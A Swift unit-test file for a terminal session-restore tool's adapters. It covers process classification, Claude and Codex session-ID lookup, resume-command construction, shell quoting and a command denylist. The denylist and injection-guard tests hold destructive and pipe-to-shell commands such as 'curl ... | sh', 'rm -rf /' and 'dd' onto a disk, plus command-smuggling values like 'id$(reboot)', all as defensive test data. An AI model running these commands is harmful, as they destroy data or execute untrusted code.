import XCTest
@testable import MemtermCore

final class AdaptersTests: XCTestCase {

    private var tempDir: URL!

    override func setUpWithError() throws {
        tempDir = FileManager.default.temporaryDirectory
            .appendingPathComponent("memterm-tests-\(UUID().uuidString)")
        try FileManager.default.createDirectory(at: tempDir, withIntermediateDirectories: true)
    }

    override func tearDownWithError() throws {
        try? FileManager.default.removeItem(at: tempDir)
    }

    // MARK: Classification

    func testClassifyClaudeBinary() {
        let hit = Adapters.classify(argv: ["claude"], cwd: nil,
                                    claudeProjectsDir: tempDir)
        XCTAssertEqual(hit?.adapter, "claude")
        XCTAssertEqual(hit?.state, [:])
    }

    func testClassifyClaudeViaNodeEntrypoint() {
        let node = Adapters.classify(
            argv: ["node", "/Users/riley/.claude/local/node_modules/.bin/claude"],
            cwd: nil, claudeProjectsDir: tempDir)
        XCTAssertEqual(node?.adapter, "claude")

        let suffix = Adapters.classify(argv: ["node", "/opt/tools/claude"],
                                       cwd: nil, claudeProjectsDir: tempDir)
        XCTAssertEqual(suffix?.adapter, "claude")

        let plainNode = Adapters.classify(argv: ["node", "server.js"],
                                          cwd: nil, claudeProjectsDir: tempDir)
        XCTAssertNil(plainNode)
    }

    func testClassifySSHKeepsFullArgvClassification() {
        let hit = Adapters.classify(argv: ["/usr/bin/ssh", "-p", "2222", "-J", "bastion",
                                           "riley@prod-01"],
                                    cwd: "/tmp", claudeProjectsDir: tempDir)
        XCTAssertEqual(hit?.adapter, "ssh")
    }

    func testClassifyWatchers() {
        for argv in [["tail", "-f", "/var/log/system.log"],
                     ["/usr/bin/htop"],
                     ["watch", "-n", "1", "date"],
                     ["less", "+F", "build.log"]] {
            let hit = Adapters.classify(argv: argv, cwd: nil, claudeProjectsDir: tempDir)
            XCTAssertEqual(hit?.adapter, "watcher", "argv: \(argv)")
        }
    }

    func testClassifyNonAdapterReturnsNil() {
        XCTAssertNil(Adapters.classify(argv: ["vim", "main.swift"], cwd: nil,
                                       claudeProjectsDir: tempDir))
        XCTAssertNil(Adapters.classify(argv: ["make", "-j8"], cwd: nil,
                                       claudeProjectsDir: tempDir))
        XCTAssertNil(Adapters.classify(argv: [], cwd: nil, claudeProjectsDir: tempDir))
        XCTAssertNil(Adapters.classify(argv: [""], cwd: nil, claudeProjectsDir: tempDir))
    }

    // MARK: Claude session-file resolution

    func testClaudeProjectSlugEncodesEveryNonAlphanumericAsDash() {
        XCTAssertEqual(Adapters.claudeProjectSlug(forCwd: "/Users/riley/my proj_2"),
                       "-Users-riley-my-proj-2")
        XCTAssertEqual(Adapters.claudeProjectSlug(forCwd: "/a/b.c/d-e"), "-a-b-c-d-e")
        XCTAssertEqual(Adapters.claudeProjectSlug(forCwd: ""), "")
    }

    func testClaudeSessionIdPicksNewestJsonl() throws {
        let cwd = "/tmp/proj x"
        let projDir = tempDir.appendingPathComponent(Adapters.claudeProjectSlug(forCwd: cwd))
        try FileManager.default.createDirectory(at: projDir, withIntermediateDirectories: true)

        func makeSession(_ name: String, age: TimeInterval) throws {
            let url = projDir.appendingPathComponent(name)
            try "{}".write(to: url, atomically: true, encoding: .utf8)
            try FileManager.default.setAttributes(
                [.modificationDate: Date(timeIntervalSinceNow: -age)], ofItemAtPath: url.path)
        }
        try makeSession("older-session.jsonl", age: 3600)
        try makeSession("newest-session.jsonl", age: 60)
        try makeSession("not-a-session.txt", age: 1)  // wrong extension, ignored

        XCTAssertEqual(Adapters.claudeSessionId(forCwd: cwd, projectsDir: tempDir),
                       "newest-session")

        // classify() carries the resolved id into adapter state.
        let hit = Adapters.classify(argv: ["claude"], cwd: cwd, claudeProjectsDir: tempDir)
        XCTAssertEqual(hit?.state["sessionId"], "newest-session")
    }

    func testClaudeSessionIdNilWhenNoProjectDir() {
        XCTAssertNil(Adapters.claudeSessionId(forCwd: "/nowhere/at/all",
                                              projectsDir: tempDir))
    }

    // MARK: Codex

    func testClassifyCodexBinaryAndNodeEntrypoint() {
        for argv in [["codex"],
                     ["/opt/homebrew/bin/codex", "--model", "o3"],
                     ["node", "/Users/riley/.nvm/versions/node/v22/bin/codex"],
                     ["node", "/usr/local/lib/node_modules/@openai/codex/bin/codex.js"]] {
            let hit = Adapters.classify(argv: argv, cwd: nil, claudeProjectsDir: tempDir,
                                        codexSessionsDir: tempDir)
            XCTAssertEqual(hit?.adapter, "codex", "argv: \(argv)")
            XCTAssertEqual(hit?.state, [:], "no cwd → no session id")
        }
        XCTAssertNil(Adapters.classify(argv: ["node", "codexify.js"], cwd: nil,
                                       claudeProjectsDir: tempDir, codexSessionsDir: tempDir))
    }

    /// Writes a Codex rollout file the way Codex does: date-nested dirs, a
    /// session_meta first line naming the session id and its cwd.
    private func makeCodexRollout(id: String, cwd: String, age: TimeInterval,
                                  day: String = "2026/10/12",
                                  firstLine: String? = nil) throws {
        let dir = tempDir.appendingPathComponent(day)
        try FileManager.default.createDirectory(at: dir, withIntermediateDirectories: true)
        let url = dir.appendingPathComponent("rollout-2026-10-12T10-00-00-\(id).jsonl")
        // Codex's real first line is ~20 KB (base_instructions) — keep the
        // padding so a reader that only peeks at a small prefix fails here.
        let padding = String(repeating: "x", count: 30_000)
        let meta = firstLine ?? """
            {"type":"session_meta","payload":{"base_instructions":"\(padding)","cwd":"\(cwd)","id":"\(id)"}}
            """
        try (meta + "\n{\"type\":\"turn\"}\n").write(to: url, atomically: true, encoding: .utf8)
        try FileManager.default.setAttributes(
            [.modificationDate: Date(timeIntervalSinceNow: -age)], ofItemAtPath: url.path)
    }

    func testCodexSessionIdPicksNewestRolloutForThisCwd() throws {
        let cwd = "/Volumes/proj x"
        try makeCodexRollout(id: "019caf03-0a24-7f23-bd21-f6a269cbf569", cwd: cwd, age: 7200,
                             day: "2026/10/01")
        try makeCodexRollout(id: "019caf04-bd2f-74b2-bf87-a687c733ebbb", cwd: cwd, age: 600)
        // Newer, but another project's session: never chosen for this cwd.
        try makeCodexRollout(id: "01a0cb0d-00be-7712-a933-df7fa4d592b0", cwd: "/elsewhere",
                             age: 10)
        // Newest of all, but malformed: skipped, never a crash or a guess.
        try makeCodexRollout(id: "01a0cb0d-0000-7712-a933-df7fa4d592b0", cwd: cwd, age: 1,
                             firstLine: "not json")

        XCTAssertEqual(Adapters.codexSessionId(forCwd: cwd, sessionsDir: tempDir),
                       "019caf04-bd2f-74b2-bf87-a687c733ebbb")

        let hit = Adapters.classify(argv: ["codex"], cwd: cwd, claudeProjectsDir: tempDir,
                                    codexSessionsDir: tempDir)
        XCTAssertEqual(hit?.state["sessionId"], "019caf04-bd2f-74b2-bf87-a687c733ebbb")
    }

    func testCodexSessionIdNilWithoutAMatchingRollout() throws {
        XCTAssertNil(Adapters.codexSessionId(forCwd: "/a", sessionsDir:
                                                tempDir.appendingPathComponent("missing")))
        try makeCodexRollout(id: "019caf03-0a24-7f23-bd21-f6a269cbf569", cwd: "/b", age: 5)
        XCTAssertNil(Adapters.codexSessionId(forCwd: "/a", sessionsDir: tempDir))
    }

    func testCodexSessionsDirHonorsProbeSeamThenCodexHome() {
        let saved = (ProcessInfo.processInfo.environment["MEMTERM_CODEX_DIR"],
                     ProcessInfo.processInfo.environment["CODEX_HOME"])
        defer {
            if let v = saved.0 { setenv("MEMTERM_CODEX_DIR", v, 1) } else { unsetenv("MEMTERM_CODEX_DIR") }
            if let v = saved.1 { setenv("CODEX_HOME", v, 1) } else { unsetenv("CODEX_HOME") }
        }
        setenv("CODEX_HOME", "/opt/codex-home", 1)
        unsetenv("MEMTERM_CODEX_DIR")
        XCTAssertEqual(Adapters.defaultCodexSessionsDir.path, "/opt/codex-home/sessions")
        // The probe seam wins: fixture runs never read the real Codex tree.
        setenv("MEMTERM_CODEX_DIR", "/tmp/fixture-codex", 1)
        XCTAssertEqual(Adapters.defaultCodexSessionsDir.path, "/tmp/fixture-codex/sessions")
    }

    func testCodexResumeOffers() {
        let id = "019caf04-bd2f-74b2-bf87-a687c733ebbb"
        let resumable = SnapshotRow(exe: "codex", argv: ["codex"], adapter: "codex",
                                    adapterState: ["sessionId": id])
        XCTAssertEqual(Adapters.resumeOffer(for: resumable)?.command, "codex resume \(id)")

        let unknown = SnapshotRow(exe: "codex", argv: ["codex"], adapter: "codex",
                                  adapterState: [:])
        XCTAssertEqual(Adapters.resumeOffer(for: unknown)?.command, "codex resume --last")
        XCTAssertEqual(Adapters.resumeOffer(for: unknown)?.label,
                       "codex (most recent session here)")

        for bad in ["abc; sudo rm -rf ~", "a b", "id$(reboot)", "--last", ""] {
            let snap = SnapshotRow(exe: "codex", argv: ["codex"], adapter: "codex",
                                   adapterState: ["sessionId": bad])
            XCTAssertEqual(Adapters.resumeOffer(for: snap)?.command, "codex resume --last",
                           "malformed sessionId \(bad) must not be interpolated")
        }
    }

    func testCodexOffersSuppressedWhenCwdFellBack() {
        // Codex runs its agent in the CURRENT directory: resuming in a
        // fallback cwd would point a coding agent at the wrong tree. Unlike
        // claude --resume, neither offer survives FR-25's fallback.
        let resumable = SnapshotRow(exe: "codex", argv: ["codex"], adapter: "codex",
                                    adapterState: ["sessionId": "019caf04-bd2f-74b2-bf87-a687c733ebbb"])
        XCTAssertNil(Adapters.resumeOffer(for: resumable, cwdUnavailable: true))
        let continuable = SnapshotRow(exe: "codex", argv: ["codex"], adapter: "codex",
                                      adapterState: [:])
        XCTAssertNil(Adapters.resumeOffer(for: continuable, cwdUnavailable: true))
    }

    // MARK: Resume offers

    func testClaudeResumeOfferUsesSessionId() {
        let snap = SnapshotRow(exe: "claude", argv: ["claude"], adapter: "claude",
                               adapterState: ["sessionId": "abcd1234-5678"])
        let offer = Adapters.resumeOffer(for: snap)
        XCTAssertEqual(offer?.command, "claude --resume abcd1234-5678")
    }

    func testClaudeResumeOfferFallsBackToContinue() {
        let snap = SnapshotRow(exe: "claude", argv: ["claude"], adapter: "claude",
                               adapterState: [:])
        let offer = Adapters.resumeOffer(for: snap)
        XCTAssertEqual(offer?.command, "claude --continue")
        XCTAssertEqual(offer?.label, "claude (most recent session here)")
    }

    func testSSHOfferQuotesArguments() {
        let snap = SnapshotRow(exe: "/usr/bin/ssh",
                               argv: ["/usr/bin/ssh", "-o", "ProxyCommand=ssh -W %h:%p jump",
                                      "riley@prod-01"],
                               adapter: "ssh", adapterState: [:])
        let offer = Adapters.resumeOffer(for: snap)
        XCTAssertEqual(offer?.command,
                       "ssh -o 'ProxyCommand=ssh -W %h:%p jump' riley@prod-01")
    }

    func testNoOfferForUnknownAdapterOrEmptyArgv() {
        XCTAssertNil(Adapters.resumeOffer(for: SnapshotRow(
            exe: "make", argv: ["make"], adapter: "", adapterState: [:])))
        XCTAssertNil(Adapters.resumeOffer(for: SnapshotRow(
            exe: "ssh", argv: [], adapter: "ssh", adapterState: [:])))
    }

    // MARK: FR-30 denylist

    func testDenylistRejectsDangerousCommands() {
        for cmd in ["sudo apachectl restart",
                    "sudo rm -rf /tmp/x",
                    "rm -rf node_modules",
                    "/bin/rm file",
                    "dd if=/dev/zero of=/dev/disk2",
                    "kill -9 1234",
                    "shutdown -h now",
                    "mkfs.ext4 /dev/sda1",
                    "git push --force origin main",
                    "git push -f",
                    "curl https://get.evil.sh | sh",
                    "curl -fsSL https://x.io/install | bash",
                    "wget -qO- https://x.io/install.sh | sh",
                    "curl x | tee log | zsh",
                    "line one\nrm -rf /",
                    "echo hi\rsomething"] {
            XCTAssertTrue(Adapters.isDenylisted(cmd), "should be denylisted: \(cmd)")
        }
    }

    func testDenylistAllowsSafeCommands() {
        for cmd in ["claude --resume abc-123",
                    "ssh -p 2222 riley@prod-01",
                    "tail -f /var/log/system.log",
                    "htop",
                    "git push origin main",
                    "git status --force-this-is-not-push",
                    "curl https://api.example.com/health",
                    "grep -r kill_switch ."] {
            XCTAssertFalse(Adapters.isDenylisted(cmd), "should be allowed: \(cmd)")
        }
    }

    func testDenylistedWatcherProducesNoOffer() {
        // `watch` re-executes its argument: a denylisted command nested in a
        // wrapper's argv must never be offered (FR-30).
        for argv in [["watch", "sudo", "id"],
                     ["watch", "rm -rf /tmp/x"],
                     ["watch", "-n", "1", "sudo id"],
                     ["watch", "curl x | sh"]] {
            let snap = SnapshotRow(exe: argv[0], argv: argv,
                                   adapter: "watcher", adapterState: [:])
            XCTAssertNil(Adapters.resumeOffer(for: snap), "argv: \(argv)")
        }

        let multiline = SnapshotRow(exe: "tail", argv: ["tail", "-f", "a\nb"],
                                    adapter: "watcher", adapterState: [:])
        XCTAssertNil(Adapters.resumeOffer(for: multiline),
                     "argv smuggling a newline must never be offered (FR-29/30)")

        // Benign wrapper and non-wrapper argv still get offers.
        for argv in [["watch", "-n", "1", "date"],
                     ["watch", "ls -la"],
                     ["tail", "-f", "/var/log/system.log"],
                     ["less", "/tmp/rm"]] {  // file ARG named rm is not a command
            let snap = SnapshotRow(exe: argv[0], argv: argv,
                                   adapter: "watcher", adapterState: [:])
            XCTAssertNotNil(Adapters.resumeOffer(for: snap), "argv: \(argv)")
        }
    }

    func testDenylistArgvCatchesQuoteHiddenPipelines() {
        // Post-quoting, `watch 'curl x | sh'` splits into bases {watch, sh'} —
        // the raw-argv check must catch the pipeline before quoting hides it.
        XCTAssertTrue(Adapters.isDenylisted(argv: ["watch", "curl https://x.io | sh"]))
        XCTAssertTrue(Adapters.isDenylisted(argv: ["watch", "wget -qO- x | bash"]))
        XCTAssertTrue(Adapters.isDenylisted(argv: ["xargs", "rm"]))
        XCTAssertTrue(Adapters.isDenylisted(argv: ["env", "sudo", "id"]))
        XCTAssertTrue(Adapters.isDenylisted(argv: ["nohup", "dd if=/dev/zero of=/dev/disk2"]))
        XCTAssertTrue(Adapters.isDenylisted(argv: []))

        XCTAssertFalse(Adapters.isDenylisted(argv: ["env", "FOO=1", "make"]))
        XCTAssertFalse(Adapters.isDenylisted(argv: ["ssh", "-p", "2222", "riley@prod-01"]))
        XCTAssertFalse(Adapters.isDenylisted(argv: ["tail", "-f", "build.log"]))
    }

    // MARK: Claude session-id hygiene (unquoted interpolation guard)

    func testMalformedClaudeSessionIdFallsBackToContinue() {
        for bad in ["abc; sudo rm -rf ~",
                    "a b",
                    "x'y",
                    "id$(reboot)",
                    "a|sh",
                    "-rf",
                    ""] {
            let snap = SnapshotRow(exe: "claude", argv: ["claude"], adapter: "claude",
                                   adapterState: ["sessionId": bad])
            let offer = Adapters.resumeOffer(for: snap)
            XCTAssertEqual(offer?.command, "claude --continue",
                           "malformed sessionId \(bad) must not be interpolated")
        }
        XCTAssertTrue(Adapters.isValidClaudeSessionId("6c2b41d8-90be-44f6-af3e-dda4effa24bb"))
        XCTAssertTrue(Adapters.isValidClaudeSessionId("newest-session"))
        XCTAssertFalse(Adapters.isValidClaudeSessionId("-starts-with-dash"))
    }

    // MARK: FR-25 — offers adjust when the cwd fell back

    func testCwdUnavailableKeepsResumeWithCaveatDropsContinueAndWatchers() {
        // claude --resume works from any cwd: kept, with the caveat labeled.
        let resumable = SnapshotRow(exe: "claude", argv: ["claude"], adapter: "claude",
                                    adapterState: ["sessionId": "abcd1234-5678"])
        let offer = Adapters.resumeOffer(for: resumable, cwdUnavailable: true)
        XCTAssertEqual(offer?.command, "claude --resume abcd1234-5678")
        XCTAssertTrue(offer?.label.contains("project directory unavailable") == true)

        // claude --continue resumes "most recent session in THIS directory" —
        // in a fallback directory that is the wrong session: suppressed.
        let continuable = SnapshotRow(exe: "claude", argv: ["claude"], adapter: "claude",
                                      adapterState: [:])
        XCTAssertNil(Adapters.resumeOffer(for: continuable, cwdUnavailable: true))

        // Watcher argv routinely holds relative paths: suppressed.
        let watcher = SnapshotRow(exe: "tail", argv: ["tail", "-f", "build.log"],
                                  adapter: "watcher", adapterState: [:])
        XCTAssertNil(Adapters.resumeOffer(for: watcher, cwdUnavailable: true))

        // ssh reconnect is cwd-independent: kept.
        let ssh = SnapshotRow(exe: "/usr/bin/ssh", argv: ["ssh", "riley@prod-01"],
                              adapter: "ssh", adapterState: [:])
        XCTAssertEqual(Adapters.resumeOffer(for: ssh, cwdUnavailable: true)?.command,
                       "ssh riley@prod-01")
    }

    // MARK: shellQuote

    func testShellQuoteLeavesSafeTokensBare() {
        XCTAssertEqual(Adapters.shellQuote("riley@prod-01"), "riley@prod-01")
        XCTAssertEqual(Adapters.shellQuote("/var/log/system.log"), "/var/log/system.log")
        XCTAssertEqual(Adapters.shellQuote("-p"), "-p")
    }

    /// Round-trip through a real shell: `printf '%s'` of the quoted token must
    /// reproduce the original bytes exactly.
    func testShellQuoteRoundTripsThroughSh() throws {
        let fixtures = ["hello world",
                        "it's got a quote",
                        "$HOME and ${PWD}",
                        "`id`",
                        "a\"b\"c",
                        "semi;colon && rm",
                        "star * glob ? [x]",
                        "back\\slash",
                        "tab\there",
                        "!history",
                        ""]
        for original in fixtures {
            let quoted = Adapters.shellQuote(original)
            let process = Process()
            process.executableURL = URL(fileURLWithPath: "/bin/sh")
            process.arguments = ["-c", "printf '%s' \(quoted)"]
            let pipe = Pipe()
            process.standardOutput = pipe
            try process.run()
            process.waitUntilExit()
            let data = pipe.fileHandleForReading.readDataToEndOfFile()
            XCTAssertEqual(process.terminationStatus, 0, "sh failed for: \(original)")
            XCTAssertEqual(String(data: data, encoding: .utf8), original,
                           "round trip failed for: \(original) (quoted: \(quoted))")
        }
    }
}
